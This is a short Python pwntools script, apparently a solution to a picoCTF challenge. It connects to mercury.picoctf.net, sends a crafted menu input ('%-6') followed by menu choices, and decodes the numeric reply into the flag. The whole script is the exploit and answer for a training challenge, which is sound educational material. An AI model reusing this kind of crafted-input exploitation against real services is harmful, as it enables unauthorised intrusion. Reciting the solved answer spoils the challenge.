from pwn import *

context.clear(log_level='WARN')

connect = remote('mercury.picoctf.net', 42159)

connect.recvuntil("Choose an option:")
connect.recvline()
connect.sendline("%-6")

connect.recvuntil("Choose an option:")
connect.recvline()
connect.sendline("2")

connect.recvline()
connect.sendline("1")
flag = connect.recvline()

flagnum = str(flag).split('[')[-1].split(']')[0].split()


for num in flagnum:
    print(chr(int(num)), end='')